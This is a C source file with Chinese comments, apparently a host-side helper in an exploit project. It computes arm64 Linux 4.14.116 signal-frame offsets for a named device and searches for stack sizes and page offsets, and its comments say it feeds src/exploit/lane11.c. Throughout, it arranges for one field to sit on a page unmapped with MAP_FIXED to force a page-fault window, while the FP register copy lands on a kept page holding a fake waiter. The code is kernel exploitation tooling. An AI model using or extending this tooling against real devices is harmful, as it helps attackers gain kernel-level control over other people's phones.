// SPDX-License-Identifier: Apache-2.0
// lane11 帧布局推导与校准目标求解 (宿主侧执行, 不碰设备)
//
// 用途: 把 TEL-AN10 (4.14.116) 的 rt_sigreturn 信号帧几何关系算成常数,
//       供 src/exploit/lane11.c 使用, 避免"靠 panic 猜偏移"。
//
// 依据 (vendor 4.14.116 源码, 见 tools/lane11_layout.md):
//   arch/arm64/kernel/signal.c
//     struct rt_sigframe { struct siginfo info; struct ucontext uc; };
//     get_sigframe():      frame_start = round_down(ss_sp+ss_size-0x10, 16)
//                          frame_end   = frame_start - sigframe_size
//     init_user_layout():  size = offsetof(rt_sigframe, uc.uc_mcontext.__reserved)
//     setup_sigframe_layout(): fpsimd(0x210) -> [esr 0x10] -> end 0x10
//     setup_rt_frame():    regs[2] = &frame->uc        (handler 第 3 参数)
//     restore_fpsimd_context(): __copy_from_user(fpsimd.vregs, ctx->vregs, 512)
//     sys_rt_sigreturn():  restore_sigframe() 之后才 restore_altstack()
//
// 编译运行: gcc -O2 -o lane11_layout lane11_layout.c && ./lane11_layout
#include <stdio.h>
#include <stdint.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint8_t u8;

/* ---- arm64 4.14 uapi 布局 (arch/arm64/include/uapi/asm/sigcontext.h) ---- */
struct _aarch64_ctx {
  u32 magic;
  u32 size;
};
#define FPSIMD_MAGIC 0x46508001U
struct fpsimd_context {
  struct _aarch64_ctx head;
  u32 fpsr;
  u32 fpcr;
  __uint128_t vregs[32];
};
struct sigcontext_a64 {
  u64 fault_address;
  u64 regs[31];
  u64 sp;
  u64 pc;
  u64 pstate;
  u8 __reserved[4096] __attribute__((aligned(16)));
};
/* 4.14 arm64: sigset_t 为 unsigned long[1]; ucontext 里补到 1024bit */
typedef struct { unsigned long bits[1]; } sigset_a64;
typedef struct {
  void *ss_sp;
  int ss_flags;
  unsigned long ss_size;
} stack_t_a64;
struct ucontext_a64 {
  unsigned long uc_flags;
  struct ucontext_a64 *uc_link;
  stack_t_a64 uc_stack;
  sigset_a64 uc_sigmask;
  u8 __unused[1024 / 8 - sizeof(sigset_a64)];
  struct sigcontext_a64 uc_mcontext;
};
/* siginfo 在 arm64 为 128 字节 */
struct rt_sigframe_a64 {
  u8 info[128];
  struct ucontext_a64 uc;
};
struct frame_record {
  u64 fp;
  u64 lr;
};

#define TERMINATOR_SIZE 16UL /* round_up(sizeof(_aarch64_ctx), 16) */
#define EXTRA_CONTEXT_SIZE 32UL
#define PAGE 0x1000UL
#define L11_PREFERRED_PGOFF 0x220UL

static unsigned long sigframe_size(void) {
  /* init_user_layout() */
  unsigned long size = __builtin_offsetof(struct rt_sigframe_a64,
                                          uc.uc_mcontext.__reserved);
  unsigned long reserved = sizeof(((struct sigcontext_a64 *)0)->__reserved);
  unsigned long limit = size + reserved - TERMINATOR_SIZE - EXTRA_CONTEXT_SIZE;

  /* setup_sigframe_layout(): fpsimd 必分配, esr 视 fault_code 而定(本机信号
   * 由用户自发, 通常无 fault_code), 但两种情形的 total 差 0x10。 */
  size += (sizeof(struct fpsimd_context) + 15) & ~15UL; /* 0x210 */
  size += 0x10;                                          /* esr (保守: 有) */
  limit += TERMINATOR_SIZE;
  size += 0x10; /* end terminator */
  return size;
}

int main(void) {
  const unsigned long sfsz = sigframe_size();
  const unsigned long off_uc = __builtin_offsetof(struct rt_sigframe_a64, uc);
  const unsigned long off_stack =
      __builtin_offsetof(struct rt_sigframe_a64, uc.uc_stack);
  const unsigned long off_vregs =
      __builtin_offsetof(struct rt_sigframe_a64, uc.uc_mcontext.__reserved) +
      __builtin_offsetof(struct fpsimd_context, vregs);

  printf("== 4.14.116 arm64 信号帧几何 ==\n");
  printf("sizeof(rt_sigframe)      = 0x%zx\n", sizeof(struct rt_sigframe_a64));
  printf("sigframe_size (alloc)    = 0x%zx\n", sfsz);
  printf("offsetof(frame, uc)      = 0x%zx   <- handler 收到的 ucontext* 偏移\n", off_uc);
  printf("uc_stack offset          = 0x%zx   <- restore_altstack 读点\n", off_stack);
  printf("vregs offset             = 0x%zx   <- restore_fpsimd 512B 拷贝目标\n", off_vregs);
  printf("vregs 512B span          = [0x%zx, 0x%zx)\n", off_vregs, off_vregs + 512);

  /* 目标: uc_stack 在低页(被 MAP_FIXED 打掉 -> 缺页窗口),
   *       vregs 512B 完整落在高页(保留 -> 铺伪 waiter)。 */
  printf("\n== 目标: 让低页含 uc_stack, 高页完整含 vregs ==\n");
  unsigned long found = 0;
  for (unsigned long ss = 0x8000; ss < 0x20000; ss++) {
    unsigned long ss_sp = 0x7f0000000000UL; /* 页对齐 (mmap 返回) */
    unsigned long fs = (ss_sp + ss - 0x10UL) & ~0xFUL;
    unsigned long fe = fs - sfsz;
    unsigned long us = fe + off_stack;
    unsigned long ve = fe + off_vregs;
    if ((us & ~(PAGE - 1)) == (ve & ~(PAGE - 1))) {
      continue; /* 同页, 不行 */
    }
    if ((ve & ~(PAGE - 1)) != ((ve + 511) & ~(PAGE - 1))) {
      continue; /* vregs 跨页, 不行 */
    }
    /* 低页必须高于 file 映射可读范围起点, 且低页不能含 vregs */
    if (ve <= (us & ~(PAGE - 1))) {
      continue;
    }
    found = ss;
    printf("ss_size = 0x%zx  (frame_start pgoff = 0x%zx)\n", ss,
           fs & (PAGE - 1));
    printf("  uc_stack = 0x%zx  低页 0x%zx\n", us, us & ~(PAGE - 1));
    printf("  vregs    = 0x%zx..0x%zx  高页 0x%zx\n", ve, ve + 511,
           ve & ~(PAGE - 1));
    break;
  }
  if (!found) {
    printf("未找到满足条件的初始 ss_size\n");
    return 1;
  }

  /* 校准目标: 运行时读实际帧地址, 使 frame_start & 0xFFF == WANT_PGOFF。
   *
   * 关键: off_stack / off_vregs 均相对 frame_end, 而 frame_end = frame_start - sfsz。
   * 帧长 0x480 < 4KB, 最多跨一条页边界。要求该边界落在 uc_stack 与 vregs 之间:
   *   fe_p + off_stack < PAGE  (uc_stack 在低页)
   *   fe_p + off_vregs >= PAGE (vregs 起点进高页)
   *   fe_p + off_vregs + 512 <= 2*PAGE (vregs 512B 不逃出高页)
   * 其中 fe_p = (p - sfsz) mod PAGE。 */
  unsigned long want = 0;
  int have = 0;
  for (unsigned long p = 0; p < PAGE; p++) {
    unsigned long fe_p = (p - sfsz) & (PAGE - 1);
    if (fe_p + off_stack >= PAGE) {
      continue;
    }
    if (fe_p + off_vregs < PAGE) {
      continue;
    }
    if (fe_p + off_vregs + 512 > 2 * PAGE) {
      continue;
    }
    if (p == L11_PREFERRED_PGOFF) {
      want = p;
      have = 1;
      break;
    }
    if (!have) {
      want = p;
      have = 1;
    }
  }
  if (!have) {
    printf("\n未找到合法的 WANT_PGOFF\n");
    return 1;
  }
  printf("\nWANT_PGOFF (frame_start & 0xFFF) = 0x%zx\n", want);
  printf("  frame_end 页内偏移 = 0x%zx\n", (want - sfsz) & (PAGE - 1));
  printf("  uc_stack 页内偏移 = 0x%zx (低页, 被 MAP_FIXED 打掉 -> 缺页)\n",
         ((want - sfsz) & (PAGE - 1)) + off_stack);
  printf("  vregs    页内偏移 = 0x%zx (高页, 保留 -> 铺伪 waiter)\n",
         ((want - sfsz) & (PAGE - 1)) + off_vregs);
  printf("  校准初值 0x%zx, 目标 ss_size = 0x%zx\n", (unsigned long)0x10000,
         (unsigned long)0x10000 +
             (want - ((0x10000UL - 0x10UL) & (PAGE - 1)) + PAGE) % PAGE);
  return 0;
}
